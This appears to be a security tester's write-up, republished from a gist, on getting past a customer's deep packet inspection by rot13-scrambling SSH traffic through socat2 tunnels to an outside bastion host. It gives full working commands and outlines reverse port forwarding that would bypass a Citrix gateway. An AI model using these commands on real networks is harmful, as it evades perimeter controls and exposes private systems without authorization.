<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://gist.github.com/gmurdocca/88857b58dc4668d88b0d0fae6ebf8b64">Original</a>
    <h1>Circumventing Deep Packet Inspection with Socat and Rot13</h1>
    
    <div id="readability-page-1" class="page"><div>
  <div id="file-socat_caesar_dpi-md">
      
      <div id="file-socat_caesar_dpi-md-readme">
    <article itemprop="text">
<p dir="auto">I have a Linux virtual machine inside a customer&#39;s private network. For security, this VM is reachable only via VPN + Citrix + Windows + a Windows SSH client (eg PuTTY). I am tasked to ensure this Citrix design is secure, and users can not access their Linux VM&#39;s or other resources on the internal private network in any way outside of using Citrix.</p>
<p dir="auto">The VM can access the internet. This task should be easy. The VM&#39;s internet gateway allows it to connect anywhere on the internet to TCP ports 80, 443, and 8090 only. Connecting to an internet bastion box on one of these ports works and I can send and receive clear text data using netcat. I plan to use good old SSH, listening on tcp/8090 on the bastion, with a reverse port forward configured to expose sshd on the VM to the public, to show their Citrix gateway can be circumvented.</p>
<h2 dir="auto"><a id="user-content-rejected-by-deep-packet-inspection" aria-hidden="true" href="#rejected-by-deep-packet-inspection"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Rejected by Deep Packet Inspection</h2>
<p dir="auto">I hit an immediate snag. the moment I try to establish an SSH or SSL connection over one of the allowed ports, the connection gets immediately closed. They must have a sentinel device at their gateway doing inspection of TCP packet payloads. They permit SSL to some known websites (for https), but the moment I try to create an SSL or SSH connection to an unknown server (eg. to the bastion box), their gateway instantly terminates the TCP connection!</p>
<p dir="auto">I figured it must be a deep packet inspector blocking me, a sentinel watching the conversation. In the case of SSH it may watch the protocol banner, the <code>SSH-2.0-OpenSSH_8.7</code> bit at the beginning, or it might be looking for signatures anywhere in the conversation to identify it. If it detects an SSL or SSH conversation with a non-whitelisted host, it kills the connection.</p>
<h2 dir="auto"><a id="user-content-enter-caesar" aria-hidden="true" href="#enter-caesar"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Enter Caesar</h2>
<p dir="auto">So, I figure, why not do a rot13 over the entire conversation. Rot13, aka the Caesar Cypher, was developed circa 50 B.C. by Gaius Julius Caesar, which he used to protect messages of military significance. Being a simple mapping of the alphabet to itself rotated N times, thus having a key space of only 25, it would be amusing to use this ancient &#34;encryption&#34; method as a tool in a modern exploit. Scrambling the alphabetic characters of an SSH or SSL conversation in such a way should hopefully throw the deep packet inspection sentinel off the scent and allow the traffic to pass.</p>
<p dir="auto">Rot13 is commonly installed from the bsdgames package in Linux. I tasked myself with building a rot13 transcoder pipeline, applying rot13 on every TCP message leaving the VM on a specific port, letting it go through the gateway&#39;s sentinel, and un-rot13 (or reapplying it with key=13) it back to its original form (and do same in reverse direction), and having the SSH client and server sit either side of this transcoder. Thus the OpenSSH banner would become <code>FFU-2.0-BcraFFU_8.7</code> and the sentinel should let that (and the rest of the conversation) through. This sounded like a task for the socat tool, in particular the socat v2 feature of supporting unidirectional dual inter address chaining, see here:  <a href="http://www.dest-unreach.org/socat/doc/socat-addresschain.html" rel="nofollow">http://www.dest-unreach.org/socat/doc/socat-addresschain.html</a></p>
<h2 dir="auto"><a id="user-content-testing" aria-hidden="true" href="#testing"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Testing</h2>
<p dir="auto">To test, I used docker to install socat2 on either end, available ready to go via docker hub: timotto/docker-socat2. The invocations are as follows.</p>
<h3 dir="auto"><a id="user-content-on-the-bastion" aria-hidden="true" href="#on-the-bastion"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>On the Bastion</h3>
<p dir="auto">sshd is listening on tcp/22 as usual. We invoke the docker container, mapping the host to fqdn <code>host.docker.internal</code> inside container:</p>
<pre><code>docker run -it -p 8090:8090 --add-host host.docker.internal:$(ip addr show docker0 | grep -Po &#39;inet \K[\d.]+&#39;) timotto/docker-socat2 bash
</code></pre>
<p dir="auto">Inside container at bash, install rot13 and start socat2, listening on tcp/8090 on the internet:</p>
<pre><code># install rot13
apt update; apt install bsdgames -y
# start socat2
socat TCP4:host.docker.internal:22 &#34;system1:stdbuf -o0 -- /usr/games/rot13 % system1:stdbuf -o0 -- /usr/games/rot13 | TCP4-LISTEN:8090,reuseaddr,fork&#34;
</code></pre>
<p dir="auto">Notes:</p>
<ul dir="auto">
<li>the <code>TCP4:host.docker.internal:22</code> part connects to sshd on the bastion</li>
<li>the <code>&#34;system1:stdbuf -o0 -- /usr/games/rot13 % system1:stdbuf -o0 -- /usr/games/rot13 | TCP4-LISTEN:8090,reuseaddr,fork&#34;</code> part listens publically on tcp/8090 and does the rot13 transcoding using socat2&#39;s dual inter address chaining</li>
<li><code>stdbuf -o0</code> is used to flush stdout often, else rot13 will flush per-line only, breaking the SSH protocol causing timeouts</li>
</ul>
<h3 dir="auto"><a id="user-content-on-the-vm-inside-protected-network" aria-hidden="true" href="#on-the-vm-inside-protected-network"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>On the VM (inside protected network)</h3>
<p dir="auto">Invoke docker container, again mapping host to host.docker.internal inside container:</p>
<pre><code>docker run -it -p 8090:8090 --add-host host.docker.internal:$(ip addr show docker0 | grep -Po &#39;inet \K[\d.]+&#39;) timotto/docker-socat2 bash
</code></pre>
<p dir="auto">inside container at bash, install rot13 and start socat:</p>
<pre><code>#install rot13
apt update; apt install bsdgames -y
# start socat2
socat TCP4-LISTEN:8090,reuseaddr,fork &#34;system1:stdbuf -o0 -- /usr/games/rot13 % system1:stdbuf -o0 -- /usr/games/rot13 | TCP4-CONNECT:&lt;bastion_host&gt;:8090&#34;
</code></pre>
<p dir="auto">Notes:</p>
<ul dir="auto">
<li>the <code>TCP4-LISTEN:8090,reuseaddr,fork</code> listens on 8090 on the VM</li>
<li>the <code>&#34;system1:stdbuf -o0 -- /usr/games/rot13 % system1:stdbuf -o0 -- /usr/games/rot13 | TCP4-CONNECT:&lt;bastion_host&gt;:8090&#34;</code> connects to the bastion on tcp/8090 and does the rot13 transcoding</li>
</ul>
<p dir="auto">On another bash shell of the protected VM (eg. in another tmux window/pane):</p>
<pre><code># ssh to the bastion
ssh user@localhost -p8090
</code></pre>
<p dir="auto">Boom, we get a connection, can login and get a shell. A quick tcpdump confirms all data is being scrambled by the ancient rot13 cypher. We&#39;re in :)</p>
<h2 dir="auto"><a id="user-content-conclusion" aria-hidden="true" href="#conclusion"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Conclusion</h2>
<p dir="auto">We can now SSH from the VM to a bastion on the internet using a rot13 transcoder on the TCP stream to hide from a deep packet inspector. Now, as originally planned, we can do the usual ssh -R (reverse port forward) to expose sshd on the protected VM, and anyone can SSH to it from anywhere on the internet via the bastion directly. From here, using usual SSH port forwarding techniques, in conjunction with for example ssh-encapsulated OpenVPN, access can be gained to any resource on the private network via the bastion in our control, bypassing Citrix completely.</p>
<p dir="auto">This again shows that systems that can access the internet in some way or another can usually be compromised, even with deep packet inspecting sentinels at the perimeter.</p>
<p dir="auto">Thanks to Julius Caesar for first implementing the encoder used in this task back in ~50 B.C. and helping to crack a modern packet inspecting firewall some 2071 years later :)</p>
</article>
  </div>

  </div>
</div></div>
  </body>
</html>
